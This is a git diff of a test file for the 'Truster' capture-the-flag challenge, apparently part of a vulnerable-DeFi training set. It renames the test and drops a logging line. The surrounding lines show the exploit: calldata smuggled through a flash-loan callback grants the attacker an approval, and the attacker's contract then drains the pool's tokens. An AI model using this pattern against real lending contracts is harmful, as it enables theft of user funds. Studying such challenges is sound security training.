@@ -7,7 +7,7 @@ const TransfererAttacker = contract.fromArtifact('TransfererAttacker');
 
 const { expect } = require('chai');
 
-describe('[Challenge] Truster', function () {
+describe('[Challenge] Truster Original, dumb solution, see truster-console for one tx solution', function () {
 
     const [deployer, attacker, ...otherAccounts] = accounts;
 
@@ -43,7 +43,6 @@ describe('[Challenge] Truster', function () {
                 name: 'amount'
             }]
           }, [this.attackerContract.address, TOKENS_IN_POOL.toString()]);
-        console.log("calldata: ", callData);
         await this.pool.flashLoan(0, attacker, this.token.address, callData);
         await this.attackerContract.attack(TOKENS_IN_POOL);
     });
